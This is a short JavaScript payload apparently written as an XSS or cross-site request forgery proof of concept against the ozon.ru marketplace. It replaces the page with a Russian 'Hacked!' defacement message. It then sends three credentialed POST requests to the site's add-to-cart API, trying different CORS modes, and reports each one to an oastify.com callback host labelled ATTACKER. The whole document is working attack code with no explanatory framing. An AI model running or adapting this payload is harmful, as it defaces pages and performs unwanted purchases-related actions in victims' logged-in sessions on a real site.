alert('new_2');
document.write('<html><body><h1>Взломано!</h1><p>Ваша страница теперь выглядит так.</p></body></html>');
var ATTACKER = 'https://dm3pjhjkpudpos6lmt41kc90xr3iref3.oastify.com';

fetch('https://www.ozon.ru/api/composer-api.bx/_action/v2/addToCart', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'User-Agent': 'Android/11.0 Firefox/140.0' },
    body: JSON.stringify([{ id: 1215057882, quantity: 2 }]),
    credentials: 'include',
}).then(function() {
    navigator.sendBeacon(ATTACKER + '?cart0=fired');
});

fetch('https://www.ozon.ru/api/composer-api.bx/_action/v2/addToCart', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'User-Agent': 'Android/11.0 Firefox/140.0' },
    body: JSON.stringify([{ id: 1215057882, quantity: 2 }]),
    credentials: 'include',
    mode: 'cors'
}).then(function() {
    navigator.sendBeacon(ATTACKER + '?cart1=fired');
});

fetch('https://www.ozon.ru/api/composer-api.bx/_action/v2/addToCart', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'User-Agent': 'Android/11.0 Firefox/140.0' },
    body: JSON.stringify([{ id: 1215057882, quantity: 2 }]),
    credentials: 'include',
    mode: 'no-cors'
}).then(function() {
    navigator.sendBeacon(ATTACKER + '?cart1=fired');
});
